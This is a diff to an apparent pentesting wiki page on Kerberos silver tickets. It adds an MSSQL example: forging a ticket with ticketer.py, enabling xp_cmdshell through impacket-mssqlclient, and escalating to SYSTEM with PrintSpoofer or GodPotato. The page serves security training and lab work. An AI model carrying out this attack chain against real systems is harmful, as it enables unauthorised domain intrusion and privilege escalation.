@@ -43,6 +43,42 @@ mimikatz.exe "kerberos::ptt <TICKET_FILE>"
 
 The CIFS service is highlighted as a common target for accessing the victim's file system, but other services like HOST and RPCSS can also be exploited for tasks and WMI queries.
 
+### Example: MSSQL service (MSSQLSvc) + Potato to SYSTEM
+
+If you have the NTLM hash (or AES key) of a SQL service account (e.g., sqlsvc) you can forge a TGS for the MSSQL SPN and impersonate any user to the SQL service. From there, enable xp_cmdshell to execute commands as the SQL service account. If that token has SeImpersonatePrivilege, chain a Potato to elevate to SYSTEM.
+
+```bash
+# Forge a silver ticket for MSSQLSvc (RC4/NTLM example)
+python ticketer.py -nthash <SQLSVC_RC4> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
+  -spn MSSQLSvc/<host.fqdn>:1433 administrator
+export KRB5CCNAME=$PWD/administrator.ccache
+
+# Connect to SQL using Kerberos and run commands via xp_cmdshell
+impacket-mssqlclient -k -no-pass <DOMAIN>/administrator@<host.fqdn>:1433 \
+  -q "EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;EXEC xp_cmdshell 'whoami'"
+```
+
+- If the resulting context has SeImpersonatePrivilege (often true for service accounts), use a Potato variant to get SYSTEM:
+
+```bash
+# On the target host (via xp_cmdshell or interactive), run e.g. PrintSpoofer/GodPotato
+PrintSpoofer.exe -c "cmd /c whoami"
+# or
+GodPotato -cmd "cmd /c whoami"
+```
+
+More details on abusing MSSQL and enabling xp_cmdshell:
+
+{{#ref}}
+abusing-ad-mssql.md
+{{#endref}}
+
+Potato techniques overview:
+
+{{#ref}}
+../windows-local-privilege-escalation/roguepotato-and-printspoofer.md
+{{#endref}}
+
 ## Available Services
 
 | Service Type                               | Service Silver Tickets                                                     |
@@ -167,9 +203,8 @@ dcsync.md
 - [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
 - [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
 - [https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027](https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027)
+- [HTB Sendai – 0xdf: Silver Ticket + Potato path](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
 
 
 
 {{#include ../../banners/hacktricks-training.md}}
-
-
